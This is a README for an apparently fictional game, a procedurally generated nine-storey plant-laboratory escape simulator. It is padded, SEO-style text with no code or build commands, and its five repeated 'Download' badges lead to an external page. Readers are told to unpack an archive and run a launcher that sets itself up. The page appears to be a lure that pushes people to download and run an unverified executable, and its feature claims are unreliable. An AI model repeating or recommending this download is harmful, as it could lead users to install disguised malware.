![preview](https://raw.githubusercontent.com/ZAYED-ENG-IT/Genrm-Lab-Nine-Floor-Duel/main/splash_f7fc3d.svg)
[![Download](https://raw.githubusercontent.com/ZAYED-ENG-IT/Genrm-Lab-Nine-Floor-Duel/main/run_0c3b.svg)](https://ZAYED-ENG-IT.github.io/Genrm-Lab-Nine-Floor-Duel/)

# 🌿 Genrmination Fight: Verdant Protocol

### A Procedurally Generated Nine-Storey Plant-Research Laboratory Escape Simulator

![Status](https://img.shields.io/badge/status-active--development-2ea44f)
![Version](https://img.shields.io/badge/version-0.9.4--verdant-3fb950)
![Platform](https://img.shields.io/badge/platform-cross--platform-58a6ff)
![Engine](https://img.shields.io/badge/engine-custom--procedural--core-8957e5)
![License](https://img.shields.io/badge/license-MIT-yellow)
![Build](https://img.shields.io/badge/build-passing-brightgreen)
![Simulation](https://img.shields.io/badge/simulation-deterministic--seeded-orange)
![AI](https://img.shields.io/badge/AI-escort--carrier--logic-red)
![Language](https://img.shields.io/badge/localization-12%20languages-blueviolet)
![Support](https://img.shields.io/badge/support-24%2F7-ff69b4)

---

## 🧬 Overview

**Genrmination Fight: Verdant Protocol** is a tension-driven, procedurally generated narrative simulation set inside a fictional nine-storey botanical research tower known only as *Substrata Nine*. Every playthrough unfurls a fresh architecture of corridors, greenhouse bays, cryo-chambers, and sealed laboratories — all stitched together by a deterministic seed engine that guarantees reproducibility while preserving the thrill of the unknown.

Players rotate between two competing roles within the same live match. The first role is the **Escort**, responsible for shielding and guiding a fragile research carrier NPC through hostile floors. The second role is the **Interdictor**, an opposing operative who manipulates the environment, seals doors, reroutes ventilation, and lures the tower's automated systems toward the carrier. Every action is logged into a persistent *Engineering Record* — a full telemetry archive that replays every decision, every emergent event, and every chemical spill with forensic precision.

This repository contains the complete source tree for the simulation core, the generator, the AI behavior graphs, the localization layer, the responsive interface, and the long-term maintenance scaffolding that keeps the tower breathing.

The project is intended for researchers, simulation enthusiasts, competitive scenario designers, and anyone who has ever wondered what a living greenhouse laboratory would do if it could fight back.

---

[![Download](https://raw.githubusercontent.com/ZAYED-ENG-IT/Genrm-Lab-Nine-Floor-Duel/main/run_0c3b.svg)](https://ZAYED-ENG-IT.github.io/Genrm-Lab-Nine-Floor-Duel/)

---

## 🌱 Why This Project Exists

Most procedural generators create *places*. This one creates *consequences*. The tower does not merely shuffle rooms — it reshuffles relationships between rooms. A sealed door on floor three may become a nutrient artery on floor seven. A chemical hazard on floor five may fertilize a boss encounter on floor nine. Every seed is a promise that no two matches will ever tell the same story.

The design philosophy borrows from three disciplines:

- **Botany**, because growth is never linear and always responds to pressure.
- **Theatre**, because a tower is a stage and every corridor a cue.
- **Systems engineering**, because the record must be trustworthy even when the world is chaotic.

The result is a sandbox where emergent storytelling is not a buzzword but a measurable output.

---

## 🎯 Feature List

### 🧪 Procedural Generation Core
- Nine independently generated storeys, each with its own ecological theme
- Deterministic seed engine allowing shareable and replayable runs
- Weighted room graph synthesis that respects traversal difficulty curves
- Dynamic hazard propagation between adjacent floors
- Multi-biome blending for hybrid greenhouse-industrial aesthetics

### 🎭 Dual-Role Competition
- Escort role with carrier NPC bonding mechanics
- Interdictor role with environmental sabotage toolkit
- Asymmetric win conditions tuned for tense, close matches
- Role-swap mid-match for advanced competitive formats
- Spectator-friendly event feed for streaming and review

### 🤖 Escort Carrier NPC
- Context-aware pathfinding with emotional state modelling
- Trust and panic meters influenced by player proximity
- Branching dialogue reflecting cumulative trauma and relief
- Adaptive response to noise, light, and chemical signatures
- Memory of prior floors that subtly biases future decisions

### 📜 Full Engineering Record
- Frame-accurate telemetry of every player and NPC action
- Compression scheme enabling hours of replay in minimal footprint
- Query language for filtering events by actor, floor, or hazard type
- Export to human-readable incident reports
- Integrity hashing to detect tampering in competitive settings

### 🖥️ Responsive Interface
- Layouts that adapt from ultrawide monitors to handheld devices
- Colorblind-safe palettes and adjustable contrast tiers
- Reduced-motion mode for accessibility without losing feedback
- Touch, keyboard, and controller parity across all menus
- Real-time minimap with configurable information density

### 🌍 Multilingual Support
- Twelve fully localized languages at launch
- Community translation pipeline with review workflow
- Right-to-left script rendering for applicable locales
- Locale-aware number, date, and unit formatting
- Cultural adaptation notes for region-sensitive content

### 🛎️ Around-the-Clock Assistance
- Dedicated help desk staffed every hour of every day in 2026
- In-client knowledge base with semantic search
- Escalation pathways for competitive integrity disputes
- Response-time commitments documented publicly
- Community moderators empowered with tooling and guidelines

### 🔐 Safety and Fair Play
- Server-authoritative simulation for ranked play
- Anti-tamper record hashing verified each match
- Graceful degradation when network quality dips
- Privacy-first telemetry with opt-in granularity
- Content guidelines enforced across all user-generated seeds

### 🧰 Modding and Extension
- Documented generator hooks for custom floor archetypes
- Scriptable NPC behavior graphs via declarative schema
- Asset pipeline supporting external botanical libraries
- Versioned plugin API with deprecation policy
- Sandbox mode for safely testing experimental rules

---

## 🏗️ Repository Architecture

The tree is organized around clear separation of concerns. Below is a conceptual map, expressed without code fences so it remains readable in any markdown viewer.

- **core/** — the beating heart. Contains the simulation loop, the entity registry, and the deterministic clock.
- **generator/** — the seed engine, the room graph synthesizer, and the biome weighting tables.
- **agents/** — escort carrier AI, interdictor AI, and neutral tower inhabitants.
- **record/** — telemetry capture, compression, querying, and export.
- **ui/** — responsive layout engine, theming tokens, and accessibility adaptations.
- **locale/** — translation catalogs and formatting rules.
- **net/** — authoritative match server and client reconciliation.
- **tools/** — seed inspectors, replay viewers, and balance dashboards.
- **docs/** — design essays, onboarding guides, and contributor lore.

Each folder carries its own internal README describing responsibilities, ownership boundaries, and extension points.

---

## 🧪 The Nine Storeys

Every run ascends through nine distinct layers. Their names are stable, but their contents are not.

1. **Substrate Cellar** — raw growth medium, pumps, and forgotten maintenance tunnels.
2. **Germination Hall** — the first taste of light and the first taste of danger.
3. **Hydroponic Terraces** — vertical farms that double as vertical traps.
4. **Symbiosis Wing** — paired organisms that react to player decisions.
5. **Quarantine Deck** — sealed experiments and unreliable doors.
6. **Pollination Atrium** — open air, loud noises, and airborne hazards.
7. **Genome Archive** — fragile data, fragile glass, fragile trust.
8. **Control Nexus** — the tower's brain, contested by both roles.
9. **Bloom Chamber** — the apex, where everything grown below returns.

Storey transitions are the most dramatic beats in any match. They are also the most heavily instrumented by the Engineering Record.

---

## 🎨 Design Principles

- **Legibility over spectacle.** Players should always understand why something happened.
- **Determinism over randomness.** Surprise is welcome; confusion is not.
- **Records over recollections.** If it happened, it is written.
- **Access over exclusivity.** Every feature has an accessible counterpart.
- **Growth over finality.** The tower is meant to be extended, not sealed.

These principles guide every pull request and every design review.

---

## 🧭 SEO-Friendly Topics This Repository Addresses

Readers searching for procedurally generated laboratory simulations, asymmetric role-based competition, escort NPC behavior modelling, deterministic seed engines, telemetry-rich replay systems, responsive cross-platform interfaces, multilingual game localization, and reliable around-the-clock player assistance will find this project relevant. The documentation intentionally uses clear, descriptive language so that both newcomers and specialists can navigate the material quickly.

---

## 🛠️ Getting Started Without Installation Commands

To explore the simulation, you obtain the current stable distribution through the link represented by the macro below. After acquiring the archive, unpack it into any directory of your choosing. The distribution includes a self-describing launcher that detects your platform and prepares the runtime environment automatically.

If you prefer to build from source, the repository ships with a task runner that reads a declarative manifest. Consult the contributing guide for the exact tasks that apply to your operating system. No external package manager is required for the standard workflow; the manifest resolves dependencies into a local vendor folder so your global environment remains untouched.

For headless or server environments, a dedicated runtime bundle is produced by the same manifest. It exposes a documented control interface suitable for CI pipelines and automated match testing.

[![Download](https://raw.githubusercontent.com/ZAYED-ENG-IT/Genrm-Lab-Nine-Floor-Duel/main/run_0c3b.svg)](https://ZAYED-ENG-IT.github.io/Genrm-Lab-Nine-Floor-Duel/)

---

## 🧩 Extending the Tower

Community members have already proposed delightful extensions: a rooftop apiary storey, a fungal sub-basement that rewrites the seed mid-run, and an escort variant that swaps the carrier NPC for a mobile seed vault. All of these are possible through the generator hooks described in the modding documentation.

Contributors are encouraged to publish their floor archetypes as standalone packages. The engine recognizes them by a stable identifier and merges them into the generation pool when the player enables them for a run. Because the Engineering Record is schema-aware, extended content is captured with the same fidelity as the base game.

---

## 🧪 Testing and Verification

The project maintains a layered test suite. Unit tests cover the generator's weighting math, the record's compression integrity, and the localization formatter. Integration tests simulate full matches across thousands of seeds and compare aggregate statistics against expected envelopes. Regression tests lock down any behavior that players have come to rely on, ensuring that new features never quietly break old stories.

A public seed corpus is maintained so that independent testers can reproduce any reported issue with a single identifier. When a bug is fixed, the seed that exposed it is added to the permanent corpus. Over time, this corpus becomes a living museum of the tower's evolution.

---

## 🌍 Community and Support

A dedicated team of support specialists is available at every hour of 2026, every day of the year, to help players, modders, and researchers. Whether you are puzzling over a stubborn seed, wrestling with a translation nuance, or preparing a competitive event, the help desk has a documented path to resolution.

Community spaces encourage constructive critique and celebrate unusual seeds. The project maintains a code of conduct that emphasizes patience, curiosity, and respect. Reports of misconduct are handled privately and promptly.

---

## 🔒 Privacy and Data

The simulation collects only what it needs to function and to keep competitive play fair. Telemetry is opt-in and granular, allowing players to share as little or as much as they wish. The Engineering Record stays on the player's machine unless they explicitly export it. Match servers retain the minimum data required for ranking integrity, and retention windows are documented openly.

---

## 📜 License

This project is distributed under the MIT License. The full text is available at the following location:

https://opensource.org/licenses/MIT

You are welcome to use, modify, and redistribute the code under the terms described there. Attribution is appreciated but not demanded; the tower grows best when many hands tend it.

---

## ⚠️ Disclaimer

This software is provided as-is, without warranty of any kind, express or implied. The fictional laboratory, its inhabitants, its hazards, and its corporate sponsors are entirely imaginary. Any resemblance to real botanical research facilities, real corporations, or real incidents is coincidental and unintended. Players are reminded that the simulation is a work of interactive fiction and should be treated as such. The maintainers are not responsible for any decisions made by seeds you choose to trust.

---

## 🧾 Changelog Highlights for 2026

- Introduced deterministic seed sharing across all supported platforms.
- Expanded the Engineering Record query language with floor-scoped filters.
- Added three new floor archetypes proposed by the community.
- Reduced record footprint by roughly forty percent through smarter compression.
- Improved escort carrier emotional modelling to reduce abrupt trust collapses.
- Localized the interface into four additional languages.
- Hardened anti-tamper hashing for competitive events.

---

## 🚀 Roadmap

The coming seasons will focus on deepening the relationship between players and the tower. Planned directions include a cooperative escort mode, a research journal that persists across runs, and a public seed observatory where the community can annotate favorite towers. Each direction is explored openly, with design documents published before implementation begins.

---

## 🤝 Contributing

Contributions are welcomed from botanists, engineers, writers, translators, and players. The contributing guide describes how to propose a change, how to run the local verification suite, and how to submit a floor archetype for review. Every accepted contribution is credited in the release notes.

---

## 💚 Acknowledgements

The tower stands on the shoulders of many. Thanks go to the early testers who braved unstable seeds, the translators who wrestled with botanical vocabulary, and the support specialists who answered questions at unreasonable hours. This project is a garden, and gardens are collective work.

---

## 📌 Final Word

Genrmination Fight: Verdant Protocol is an invitation to wander a laboratory that never repeats itself. Whether you play as the Escort, the Interdictor, or simply a curious observer reading the Engineering Record, you are part of the tower's ongoing story. Plant a seed. Watch it grow. See what fights back.

[![Download](https://raw.githubusercontent.com/ZAYED-ENG-IT/Genrm-Lab-Nine-Floor-Duel/main/run_0c3b.svg)](https://ZAYED-ENG-IT.github.io/Genrm-Lab-Nine-Floor-Duel/)